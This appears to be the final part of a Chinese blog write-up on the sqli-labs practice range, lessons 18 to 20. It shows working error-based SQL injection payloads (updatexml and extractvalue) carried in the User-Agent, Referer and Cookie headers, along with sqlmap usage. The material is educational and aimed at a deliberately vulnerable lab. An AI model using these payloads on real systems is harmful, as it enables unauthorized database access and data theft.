+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403172336280.png"></p>
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181228479.png"></p>
+<p>用**$_server[‘http_user_agent’]** 去接受用户的代理设置。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181245464.png"></p>
+<p>$_SERVER[‘REMOTE_ADDR’] 获取用户的真实ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;]; //访问端（有可能是用户，有可能是代理的）IP</span><br><span class="line">$_SERVER[&#x27;HTTP_CLIENT_IP&#x27;]; //代理端的（有可能存在，可伪造）</span><br><span class="line">$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]; //用户是在哪个IP使用的代理（有可能存在，也可以伪造</span><br></pre></td></tr></table></figure>
+
+<p>从源码中可知，uname,passwd 被过滤掉了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181249052.png"></p>
+<p>后面执行了一段插入语句把 $uafent 和 $ip 的值插入到数据库中，执行插入语句并输出了 这个用户代理的变量</p>
+<p>那么 user_agent 是可以通过 burp 更改的，后面还打印报错信息。说明可以进行报错注入。但是第一条件为真，才能执行后面的插入语句，说明我们需要先登陆进去。</p>
+<p><strong>使用admin admin 登陆进去后，打印了用户代理</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181301297.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname) #原始sql语句</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;    后面使用 or &#x27;1&#x27;=&#x27;1 是为了闭合 后面的单引号</span><br><span class="line">INSERT INTO `security`.`uagents` (&#x27;&#x27;or updatexml(1,concat(0x7e,(databse())),1) or &#x27;1&#x27;=&#x27;1&#x27;, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181404438.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">另一种闭合方式  &#x27; or updatexml(1,concat(0x7e,(database())),1),&#x27;&#x27;,&#x27;&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p><strong>表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),&#x27;&#x27;,&#x27;&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>ps：闭合方式不同，但表 库 的操作是一样的。</p>
+<h3 id="sqlmap-user-angent注入"><a href="#sqlmap-user-angent注入" class="headerlink" title="sqlmap   - user angent注入"></a>sqlmap   - user angent注入</h3><p>1.把数据包保存在一个txt 用* 指定测试的位置</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>2.使用 –level 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数</span><br><span class="line">当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181725499.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181727709.png"></p>
+<p>使用$_SERVER[REFERER] 去接受用户的来源地址 ，并赋值给$uagent。成功之后使用插入语句 把来源地址,ip插入到referers表中</p>
+<p>这和上一关一样，区别就是这关是feferers注入，上一关是user-angent 注入。同样是报错注入一样的闭合。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181734160.png"></p>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181754069.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181822058.png"></p>
+<p>第一个图片代码先设置了cookie 第二个判断是submit是否提交如果，尚未提交执行代码块。并把 cookie 带入数据库中查询。存在sql注入</p>
+<p>也就是cookie 注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: uname=admin&#x27; or extractvalue(1,concat(0x7e,(select database())))#; </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181922897.png"></p>
+<h1 id="高级注入"><a href="#高级注入" class="headerlink" title="高级注入"></a>高级注入</h1></article><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/null" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/null" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=sqli-labs靶场&amp;url=https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/&amp;pic=https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div><div class="post-tools-right"></div></div><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E9%9D%B6%E5%9C%BA/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>靶场<span class="tagsPageCount">1</span></a></div></div><div class="post_share"><div class="social-share" data-image="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://npm.elemecdn.com/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><div class="post-copyright"><i class="anzhiyufont anzhiyu-icon-copyright"></i><div class="post-copyright__author"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/">原创</a><a class="post-copyright-title"><span>sqli-labs靶场</span></a></div><div class="post-copyright-info-box"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"></span><a class="link" href="https://94248.github.io">废柴</a></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a class="link" href="https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/">https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/</a></span><span class="copy-button" onclick="rm.copyPageUrl('https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/')"><i class="anzhiyufont anzhiyu-icon-copy"></i></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://94248.github.io" target="_blank">废柴の博客</a>！</span></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/01/31/%E2%80%9C%E9%9D%B6%E6%9C%BA-CozyHosting%E2%80%9D/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202402011438304.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">“靶机--CozyHosting”</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="author-info-top"> <div class="card-info-avatar"></div></div><div class="author-info__sayhi" id="author-info__sayhi"></div><h1 class="author-info__name">废柴</h1><div class="author-info__description">网络攻防无绝对</div><div class="banner-button-group"><a class="banner-button" onclick="pjax.loadUrl(&quot;/about/&quot;)"><span class="banner-button-text">了解更多</span><i class="anzhiyufont anzhiyu-icon-arrow-circle-right" style="font-size: 1.5rem"></i></a></div><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/94248" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">#sqli-labs靶场通关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-1"><span class="toc-number">1.1.</span> <span class="toc-text">less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E8%A7%92%E5%BA%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">黑盒角度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E8%A7%92%E5%BA%A6"><span class="toc-number">1.1.2.</span> <span class="toc-text">白盒角度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">开始注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">联合注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2"><span class="toc-number">1.2.</span> <span class="toc-text">less-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">测试注入类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-3"><span class="toc-number">1.3.</span> <span class="toc-text">less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">测试类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">查看回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">源码查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88-%E2%80%98%E2%80%99-%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE"><span class="toc-number">1.3.4.</span> <span class="toc-text">闭合(‘’)  查看回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-4"><span class="toc-number">1.4.</span> <span class="toc-text">less-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%9F%A5%E7%9C%8B-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">源码查看</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-5"><span class="toc-number">1.5.</span> <span class="toc-text">less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9burp%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.3.</span> <span class="toc-text">借助burp盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-6"><span class="toc-number">1.6.</span> <span class="toc-text">less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-7"><span class="toc-number">1.7.</span> <span class="toc-text">less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-8"><span class="toc-number">1.8.</span> <span class="toc-text">less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-9"><span class="toc-number">1.9.</span> <span class="toc-text">less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-10"><span class="toc-number">1.10.</span> <span class="toc-text">less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-11"><span class="toc-number">1.11.</span> <span class="toc-text">less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.11.1.</span> <span class="toc-text">联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-12"><span class="toc-number">1.12.</span> <span class="toc-text">less-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-13"><span class="toc-number">1.13.</span> <span class="toc-text">less-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-14"><span class="toc-number">1.14.</span> <span class="toc-text">less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-15"><span class="toc-number">1.15.</span> <span class="toc-text">less-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-16"><span class="toc-number">1.16.</span> <span class="toc-text">less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-17"><span class="toc-number">1.17.</span> <span class="toc-text">less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-%E5%AD%97%E6%AE%B5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.17.1.</span> <span class="toc-text">password 字段报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-18"><span class="toc-number">1.18.</span> <span class="toc-text">less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-user-angent%E6%B3%A8%E5%85%A5"><span class="toc-number">1.18.1.</span> <span class="toc-text">sqlmap   - user angent注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-19"><span class="toc-number">1.19.</span> <span class="toc-text">less-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-20"><span class="toc-number">1.20.</span> <span class="toc-text">less-20</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">高级注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/" title="sqli-labs靶场"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqli-labs靶场"/></a><div class="content"><a class="title" href="/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/" title="sqli-labs靶场">sqli-labs靶场</a><time datetime="2024-03-09T13:24:43.000Z" title="发表于 2024-03-09 21:24:43">2024-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/31/%E2%80%9C%E9%9D%B6%E6%9C%BA-CozyHosting%E2%80%9D/" title="“靶机--CozyHosting”"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202402011438304.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="“靶机--CozyHosting”"/></a><div class="content"><a class="title" href="/2024/01/31/%E2%80%9C%E9%9D%B6%E6%9C%BA-CozyHosting%E2%80%9D/" title="“靶机--CozyHosting”">“靶机--CozyHosting”</a><time datetime="2024-01-31T15:38:08.000Z" title="发表于 2024-01-31 23:38:08">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/13/msfMetasploit%E4%BD%BF%E7%94%A8/" title="msfMetasploit使用"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202401151632300.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="msfMetasploit使用"/></a><div class="content"><a class="title" href="/2024/01/13/msfMetasploit%E4%BD%BF%E7%94%A8/" title="msfMetasploit使用">msfMetasploit使用</a><time datetime="2024-01-13T09:25:21.000Z" title="发表于 2024-01-13 17:25:21">2024-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/07/ctfRCE%E7%AF%87/" title="ctfRCE篇"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072331075.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfRCE篇"/></a><div class="content"><a class="title" href="/2023/12/07/ctfRCE%E7%AF%87/" title="ctfRCE篇">ctfRCE篇</a><time datetime="2023-12-07T14:38:55.000Z" title="发表于 2023-12-07 22:38:55">2023-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/" title="burp+xray联动漏扫"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312021714518.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="burp+xray联动漏扫"/></a><div class="content"><a class="title" href="/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/" title="burp+xray联动漏扫">burp+xray联动漏扫</a><time datetime="2023-12-01T15:42:07.000Z" title="发表于 2023-12-01 23:42:07">2023-12-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" title="湘ICP备-xxxxxxx号">湘ICP备-xxxxxxx号</a></div></div></div></footer></div></div></div><div id="sidebar"><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211060950193.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child" style="left:-31px;"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child" style="left:17px;"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child" style="left:17px;"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><a id="switch_commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="开关弹幕"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i 